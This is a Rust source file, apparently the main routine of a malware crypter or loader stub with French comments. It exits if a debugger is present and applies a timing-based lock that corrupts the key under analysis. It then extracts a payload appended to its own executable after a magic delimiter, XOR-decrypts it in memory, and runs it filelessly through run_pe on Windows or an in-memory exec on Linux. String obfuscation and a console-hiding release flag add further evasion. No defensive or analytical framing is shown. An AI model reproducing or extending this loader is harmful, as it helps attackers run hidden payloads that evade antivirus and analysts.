// #![windows_subsystem = "windows"] // Décommenter pour la release (Mode GUI)
#![allow(unsafe_op_in_unsafe_fn)]
#![allow(unused_imports)]
#![allow(non_snake_case)]

use std::env;
use std::fs::File;
use std::io::Read;
use std::process::exit;
use std::ptr;
use obfstr::obfstr;

use crate::get_time_cycles::*;
use crate::is_being_debugged::*;
use crate::linux_mem_exec::*;
use crate::is_being_debugged::*;
use crate::resolve_rva::*;
use crate::run_pe::*;

const MAGIC_DELIMITER: &[u8] = &[0xDE, 0xAD, 0xBE, 0xEF, 0xC0, 0xFF, 0xEE, 0x11];
const PARTIAL_KEY: u8 = 0x55;
const MAX_CYCLES: u64 = 50_000_000;

fn main() {
    // 1. Anti-Debug
    if is_being_debugged() { exit(0); }
    let start_time = unsafe { get_time_cycles() };
    let current_exe = env::current_exe().unwrap_or_else(|_| exit(0));
    let mut file = File::open(current_exe).unwrap_or_else(|_| exit(0));
    let mut buffer = Vec::new();
    file.read_to_end(&mut buffer).unwrap_or_else(|_| exit(0));
    let delimiter_pos = buffer.windows(MAGIC_DELIMITER.len()).rposition(|w| w == MAGIC_DELIMITER);
    let end_time = unsafe { get_time_cycles() };
    // 2. Time Lock
    let mut corrupted_mode = false;
    if (end_time > start_time) && (end_time - start_time) > MAX_CYCLES {
        corrupted_mode = true;
    }
    if let Some(pos) = delimiter_pos {
        let encrypted_data = &buffer[pos + MAGIC_DELIMITER.len()..];
        
        let final_key = if corrupted_mode { 
            PARTIAL_KEY ^ 0xFF 
        } else { 
            PARTIAL_KEY 
        };

        // 3. Déchiffrement en mémoire
        let decrypted: Vec<u8> = encrypted_data.iter().map(|&b| b ^ final_key).collect();

        // 4. Exécution selon l'OS
        #[cfg(target_os = "linux")]
        linux_mem_exec(decrypted);

        #[cfg(target_os = "windows")]
        unsafe { run_pe(decrypted); }

    } else {
        println!("{}", obfstr!("[-] Payload introuvable !"));
        let mut s = String::new();
        std::io::stdin().read_line(&mut s).unwrap();
    }
}